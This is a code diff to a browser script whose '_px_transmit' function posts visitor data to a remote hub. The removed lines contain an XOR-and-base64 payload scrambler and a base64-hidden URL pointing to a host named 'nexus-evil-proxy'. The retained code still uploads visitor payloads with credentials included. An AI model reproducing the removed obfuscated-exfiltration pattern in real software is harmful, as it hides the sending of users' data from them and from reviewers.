@@ -14,30 +14,24 @@
         return "Un";
     };
 
-    window._px_encrypt = function(data) {
-        const key = "XAVIER_PACIFIC";
-        let out = "";
-        for(let i=0; i<data.length; i++) {
-            out += String.fromCharCode(data.charCodeAt(i) ^ key.charCodeAt(i % key.length));
-        }
-        return btoa(out);
-    };
-
     window._px_transmit = async function(p, s = null, w = false) {
         if (_stealth) {
             console.warn("[UPLINK] Stealth Mode Active. Data blocked.");
             return null;
         }
         try {
-            const b = { p: window._px_encrypt(JSON.stringify(p)) };
+            // Plain JSON over HTTPS to our own nexus-api worker. The old XOR+btoa
+            // step threw on any emoji payload (🟢/📍) and only obfuscated the
+            // visitor's own data from themselves — dropped for a reliable feed.
+            const b = { p };
             if (s || _sid) b.s = s || _sid;
             if (w) b.w = true;
-            
-            // Obfuscated Hub Access
-            const h = window.PACIFIC_HUB || atob('aHR0cHM6Ly9uZXh1cy1ldmlsLXByb3h5LnhhdmllcnNjb3R0MzAwLndvcmtlcnMuZGV2');
-            const r = await fetch(`${h}/log`, {
+
+            const hub = window.PACIFIC_HUB || `${window.API_BASE || ''}/api/uplink`;
+            const r = await fetch(hub, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
+                credentials: 'include',
                 body: JSON.stringify(b),
             });
             if (w && r.ok) return r.json();
